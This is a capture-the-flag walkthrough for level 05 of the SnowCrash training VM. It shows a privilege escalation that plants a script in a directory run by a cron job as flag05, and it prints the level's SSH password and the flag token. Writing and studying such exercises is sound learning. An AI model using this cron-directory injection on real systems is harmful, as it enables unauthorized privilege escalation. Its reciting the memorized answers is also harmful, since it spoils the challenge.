# Flag 05

- Access to Snow-Crash VM using level05/ne2searoevaevoem4ov4ar8ap credentials
```
e1r9p7% ssh -p 4242 level05@10.11.100.146
```

- When logged in I had this msg "You have new mail.", so we have an email server here
```
level05@SnowCrash:/var/mail$ cd /var/mail | ll
-rw-r--r--+ 1 root mail  58 Feb 11 13:22 level05
```
- `cat level05 `
```
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

- Tham mean the the script `/usr/sbin/openarenaserver` will exec at every `*/2 * * * *` , at every 2nd minute. I will try to cat the script

- `cat /usr/sbin/openarenaserver`
``` shell
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

- The script exce all scripts in the folder `/opt/openarenaserver/` and then remove them.

- So I will try to write a script in `/opt/openarenaserver/script.sh` that exec the `getflag` cmd and write the result at `/tmp/output`, then I will have the output in 2 min.

```
level05@SnowCrash:/var/mail$ echo "getflag > /tmp/output" > /opt/openarenaserver/script.sh
level05@SnowCrash:/var/mail$ cat /tmp/output
cat: /tmp/output: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/output
cat: /tmp/output: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/output
cat: /tmp/output: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/output
cat: /tmp/output: No such file or directory
level05@SnowCrash:/var/mail$ cat /tmp/output
Check flag.Here is your token : viuaaale9huek52boumoomioc
```